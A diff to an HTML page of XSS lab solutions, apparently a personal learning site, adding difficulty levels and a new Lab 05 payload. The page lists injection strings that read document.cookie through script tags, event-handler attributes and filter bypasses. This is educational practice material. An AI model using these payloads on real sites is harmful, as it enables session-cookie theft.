@@ -772,7 +772,7 @@ var name = '');alert(1);//';     // this executes alert(1) & XSS </code></pre>
       </div>
       <div class="xss-labs-abay-sh-content" style="display: none;">
         <p>Task for Each LAB: alert the cookie stored on the page</p>
-        <h3>Lab 01:</h3>
+        <h3>Lab 01 (Level - Easy):</h3>
         <p><b>Protection:</b> No Protection</p>
         <p>Context: within html code</p>
         <div class="code-block-wrapper"  style="margin-top: -50px;">
@@ -785,7 +785,7 @@ var name = '');alert(1);//';     // this executes alert(1) & XSS </code></pre>
             </div>
             <pre><code class="code-txt">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
         </div>
-        <h3>Lab 02:</h3>
+        <h3>Lab 02 (Level - Easy):</h3>
         <p><b>Protection:</b> script tag (&lt;script&gt; & &lt;/script&gt;) is removed (filtered)</p>
         <p>Context: within html tags ( input box placeholder ) [NOTE: btw it broke page to continuously load and show popups infinitely ]</p>
         <div class="code-block-wrapper"  style="margin-top: -50px;">
@@ -809,7 +809,7 @@ var name = '');alert(1);//';     // this executes alert(1) & XSS </code></pre>
             </div>
             <pre><code class="code-txt">x" onfocus="alert(document.cookie)</code></pre>
         </div>
-        <h3>Lab 03:</h3>
+        <h3>Lab 03 (Level - Easy):</h3>
         <p><b>Protection:</b> dot(.) is removed (filtered)</p>
         <p>Context: within html tags ( input box placeholder )</p>
         <div class="code-block-wrapper"  style="margin-top: -50px;">
@@ -822,7 +822,7 @@ var name = '');alert(1);//';     // this executes alert(1) & XSS </code></pre>
             </div>
             <pre><code class="code-txt">" onfocus="alert(document['cookie'])</code></pre>
         </div>
-        <h3>Lab 04:</h3>
+        <h3>Lab 04 (Level - Easy):</h3>
         <p><b>Protection:</b> alert keyword is replaced with [removed]</p>
         <p>Context: within html tags ( input box placeholder )</p>
         <div class="code-block-wrapper"  style="margin-top: -50px;">
@@ -835,9 +835,9 @@ var name = '');alert(1);//';     // this executes alert(1) & XSS </code></pre>
             </div>
             <pre><code class="code-txt">" onfocus="console.log(document['cookie'])</code></pre>
         </div>
-        <h3>Lab 05:</h3>
-        <p><b>Protection:</b> input is sanitized or encoded</p>
-        <p>Context: still figuring this</p>
+        <h3>Lab 05 (Level - Medium):</h3>
+        <p><b>Protection:</b> input sanitization and filtering for placeholder and dynamically added p tag.</p>
+        <p>Context: Back Button ( it works in two steps, first input this payload & then input anything and after reload press back button, boom XSS)</p>
         <div class="code-block-wrapper"  style="margin-top: -50px;">
             <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
               <button class="code-cp-btn"> 
@@ -846,7 +846,20 @@ var name = '');alert(1);//';     // this executes alert(1) & XSS </code></pre>
                     <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
                 </svg> </button>
             </div>
-            <pre><code class="code-txt">On Progress...</code></pre>
+            <pre><code class="code-txt">" onclick="alert(document.cookie)"&gt;</code></pre>
+        </div>
+        <h3>Lab 06 (Level - Medium):</h3>
+        <p><b>Protection:</b> --</p>
+        <p>Context: --</p>
+        <div class="code-block-wrapper"  style="margin-top: -50px;">
+            <div class="flex justify-end" style="position: relative; display: flex; justify-content: flex-end; padding: 0.5rem; background-color: var(--accent-color); border-bottom: 1px solid var(--border-color); top: 50px;">
+              <button class="code-cp-btn"> 
+                <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy" aria-hidden="true">
+                    <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                    <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+                </svg> </button>
+            </div>
+            <pre><code class="code-txt">payload</code></pre>
         </div>
         <!-- Next lab solutions -->
       </div>
@@ -889,4 +902,5 @@ var name = '');alert(1);//';     // this executes alert(1) & XSS </code></pre>
       <script src="../../scripts/main.js"></script>
       <script src="../../scripts/msg-popup.js"></script>
 </html>
+
 
